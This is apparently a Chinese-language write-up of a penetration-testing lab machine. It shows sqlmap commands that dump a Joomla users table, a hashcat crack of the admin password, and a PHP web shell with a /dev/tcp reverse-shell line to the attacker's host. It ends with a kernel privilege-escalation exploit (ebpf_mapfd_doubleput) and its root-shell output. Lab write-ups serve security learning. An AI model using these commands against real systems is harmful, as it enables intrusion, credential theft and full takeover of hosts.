## 信息收集 

**主机发现**
- ![](file-20260902232628961.png)
**端口探测**
- ![](file-20260902232628963.png)![](file-20260902232628966.png)
**web站点访问**
- ![](file-20260902232628968.png)
**目录扫描**
- ![](file-20260902232628972.png)
**指纹识别**
- ![](file-20260902232628975.png)![](file-20260902232628977.png)
没有识别到joomscan的版本号这里使用专用工具识别
	![](file-20260902232628996.png) 
## 漏洞利于
 搜索漏洞库发现joomla 存在sql注入
	![](file-20260902232628999.png)![](file-20260902232629004.png)
```
sqlmap -u "http://192.168.230.159/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]  
```
- ![](file-20260902232629009.png)
```
sqlmap -u "http://192.168.230.159/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --current-db 
```
- 
	![](file-20260902232629012.png)
```
sqlmap -u "http://192.168.230.159/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D "joomladb" --tables
```
- 
	![](file-20260902232629026.png)
```
sqlmap -u "http://192.168.230.159/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D "joomladb" -T "#__users" --columns
```
- ![](file-20260902232629029.png)
```
sqlmap -u "http://192.168.230.159/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D "joomladb" -T "#__users" -C "name,username,password" --dump
```
- ![](file-20260902232629031.png)
**碰撞hash密码**
```
hashcat -m 3200 -a 0 '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' /usr/share/wordlists/rockyou.txt
```
- ![](file-20260902232629034.png)
**admin:snoopy登陆**
- ![](file-20260902232629036.png)
**写shell**
- ![](file-20260902232629039.png)
- 找目录非常重要
	![](file-20260902232629041.png)
**反弹shell**
```php
<?php 
	system("bash -c 'bash -i >& /dev/tcp/192.168.230.141/8888 0>&1'");
?>
```
- ![](file-20260902232629042.png)
## 提权
**搜索特权文件**
```
sudo -l
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```
- 
	![](file-20260902232629045.png)
**bash版本**
```
echo $0
bash --version
```
- ![](file-20260902232629059.png)
**系统版本**
```
uname -a
 
cat /etc/issue
 
cat /proc/version
```
- ![](file-20260902232629061.png)
**漏洞库搜索对应版本的脚本**
- ![](file-20260902232629064.png)
下载
```
searchsploit Ubuntu 16.04 -m linux/local/39772.txt
```
**下载对应的利用脚本**
`[https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip]`
使用方法
```
user@host:~/ebpf_mapfd_doubleput$ ./compile.sh
user@host:~/ebpf_mapfd_doubleput$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@host:~/ebpf_mapfd_doubleput# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)
```
**开启web服务讲载荷下载到目标主机/tmp目录下**
- ![](file-20260902232629066.png)
**使用脚本提权成功**
```
./complie.sh 编译
./doubleput 等待运行结束即可提权成功
```
- ![](file-20260902232629067.png)
	![](file-20260902232629081.png)